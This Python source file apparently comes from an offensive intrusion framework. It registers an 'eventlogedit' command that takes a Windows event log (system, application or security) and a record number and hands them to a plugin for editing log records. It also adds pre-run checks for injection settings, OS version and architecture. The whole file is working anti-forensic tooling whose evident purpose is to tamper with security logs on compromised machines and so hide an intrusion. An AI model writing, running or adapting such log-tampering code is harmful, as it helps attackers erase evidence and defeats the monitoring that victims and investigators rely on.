
import ops.cmd
import ops
import ops.env
import ops.cmd.safetychecks
import dsz.version
from ops.cmd import getBoolOption, setBoolOption, getValueOption, setListOption, setStringOption, setIntOption
OpsCommandException = ops.cmd.OpsCommandException
VALID_OPTIONS = ['log', 'record', 'searchlen']

class EventLogEditCommand(ops.cmd.DszCommand, ):
    optgroups = {}
    reqgroups = []
    reqopts = ['log', 'record']
    defopts = {}

    def __init__(self, plugin='eventlogedit', **optdict):
        ops.cmd.DszCommand.__init__(self, plugin, **optdict)

    def validateInput(self):
        for opt in self.optdict:
            if (opt not in VALID_OPTIONS):
                return False
        for req in self.reqopts:
            if (req not in self.optdict):
                return False
        return True
    log = property((lambda x: getValueOption(x, 'log')), (lambda x, y: setListOption(x, y, 'log', ['system', 'application', 'security'])))
    record = property((lambda x: getValueOption(x, 'record')), (lambda x, y: setIntOption(x, y, 'record')))
    searchlen = property((lambda x: getValueOption(x, 'searchlen')), (lambda x, y: setIntOption(x, y, 'searchlen')))
ops.cmd.command_classes['eventlogedit'] = EventLogEditCommand
ops.cmd.aliasoptions['eventlogedit'] = VALID_OPTIONS

def mySafetyCheck(self):
    good = True
    msgparts = []
    if (ops.env.get('OPS_NOINJECT').upper() == 'TRUE'):
        good = False
        msgparts.append('OPS_NOINJECT is set to TRUE, you should probably not run eventlogedit')
    osinfo = dsz.version.Info()
    if (osinfo.major > 5):
        good = False
        msgparts.append('Vista+ OS detected, we cannot edit logs on this OS')
    if ((osinfo.arch == 'x64') and (osinfo.compiledArch != 'x64')):
        good = False
        msgparts.append('32-bit binary on 64-bit OS')
    if (not self.validateInput()):
        good = False
        msgparts.append('Your command did not pass input validation')
    msg = ''
    if (len(msgparts) > 0):
        msg = msgparts[0]
        for msgpart in msgparts[1:]:
            msg += ('\n\t' + msgpart)
    return (good, msg)
ops.cmd.safetychecks.addSafetyHandler('eventlogedit', 'ops.cmd.eventlogedit.mySafetyCheck')